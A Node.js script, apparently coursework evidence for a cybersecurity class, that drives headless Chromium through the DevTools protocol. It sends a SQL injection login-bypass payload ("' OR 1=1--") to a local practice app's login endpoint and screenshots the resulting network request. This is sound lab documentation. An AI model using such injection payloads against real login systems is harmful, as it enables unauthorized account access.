const { spawn } = require('child_process');
const http = require('http');
const fs = require('fs');

const PORT = 9231;
const CHROME = '/opt/pw-browsers/chromium-1194/chrome-linux/chrome';
const OUT = '/home/user/eafit-ciberseguridad-si3006/evidencias-p1-p2';
const PROFILE = '/tmp/chrome-profile-devtools-final';

function httpGet(path) {
  return new Promise((resolve, reject) => {
    http.get({ host: '127.0.0.1', port: PORT, path }, (res) => {
      let data = '';
      res.on('data', (c) => (data += c));
      res.on('end', () => resolve(data));
    }).on('error', reject);
  });
}
function connectCDP(wsUrl) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(wsUrl);
    ws.addEventListener('open', () => resolve(ws));
    ws.addEventListener('error', (e) => reject(e));
  });
}
function makeSender(ws) {
  let msgId = 1;
  return function send(method, params = {}) {
    return new Promise((resolve) => {
      const id = msgId++;
      const handler = (ev) => {
        const msg = JSON.parse(ev.data);
        if (msg.id === id) {
          ws.removeEventListener('message', handler);
          resolve(msg.result);
        }
      };
      ws.addEventListener('message', handler);
      ws.send(JSON.stringify({ id, method, params }));
    });
  };
}
async function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
async function click(sendDev, x, y) {
  await sendDev('Input.dispatchMouseEvent', { type: 'mousePressed', x, y, button: 'left', clickCount: 1 });
  await sendDev('Input.dispatchMouseEvent', { type: 'mouseReleased', x, y, button: 'left', clickCount: 1 });
}
async function typeText(sendDev, text) {
  for (const ch of text) {
    await sendDev('Input.dispatchKeyEvent', { type: 'keyDown', text: ch });
    await sendDev('Input.dispatchKeyEvent', { type: 'keyUp', text: ch });
  }
}

(async () => {
  fs.rmSync(PROFILE, { recursive: true, force: true });
  const proc = spawn(CHROME, [
    '--headless=new', '--no-sandbox', '--disable-gpu',
    `--remote-debugging-port=${PORT}`,
    '--remote-debugging-address=127.0.0.1',
    '--auto-open-devtools-for-tabs',
    '--window-size=1600,950',
    `--user-data-dir=${PROFILE}`,
    'http://localhost:3000/#/login',
  ]);
  proc.stderr.on('data', () => {});
  await sleep(3000);

  const list = JSON.parse(await httpGet('/json'));
  const devtoolsTarget = list.find((t) => t.url.startsWith('devtools://'));
  const pageTarget = list.find((t) => t.url.includes('localhost:3000'));

  const wsDev = await connectCDP(devtoolsTarget.webSocketDebuggerUrl);
  const sendDev = makeSender(wsDev);
  await sendDev('Page.enable');
  await sendDev('Runtime.enable');
  await sendDev('Input.enable');

  await click(sendDev, 1353, 13); // Network tab
  await sleep(800);

  // Click filter box and type "login" to isolate the row
  await click(sendDev, 1150, 93);
  await sleep(300);
  await typeText(sendDev, 'login');
  await sleep(500);

  const wsPage = await connectCDP(pageTarget.webSocketDebuggerUrl);
  const sendPage = makeSender(wsPage);
  await sendPage('Runtime.enable');
  await sendPage('Runtime.evaluate', {
    expression: `
      fetch('/rest/user/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: "' OR 1=1--", password: 'cualquiercosa' })
      }).then(r => r.status)
    `,
    awaitPromise: true,
    returnByValue: true,
  });
  await sleep(1200);

  // First (and only) row, right under the header
  await click(sendDev, 1083, 249);
  await sleep(600);

  const shotHeaders = await sendDev('Page.captureScreenshot', { format: 'png' });
  fs.writeFileSync(`${OUT}/02-devtools-network-headers.png`, Buffer.from(shotHeaders.data, 'base64'));
  console.log('headers tab screenshot saved');

  await click(sendDev, 1384, 225); // Payload tab
  await sleep(600);
  const shotPayload = await sendDev('Page.captureScreenshot', { format: 'png' });
  fs.writeFileSync(`${OUT}/02-devtools-network-payload.png`, Buffer.from(shotPayload.data, 'base64'));
  console.log('payload tab screenshot saved');

  await click(sendDev, 1521, 225); // Response tab
  await sleep(600);
  const shotResponse = await sendDev('Page.captureScreenshot', { format: 'png' });
  fs.writeFileSync(`${OUT}/02-devtools-network-response.png`, Buffer.from(shotResponse.data, 'base64'));
  console.log('response tab screenshot saved');

  wsDev.close();
  wsPage.close();
  proc.kill();
})().catch((e) => { console.error('ERROR', e); process.exit(1); });
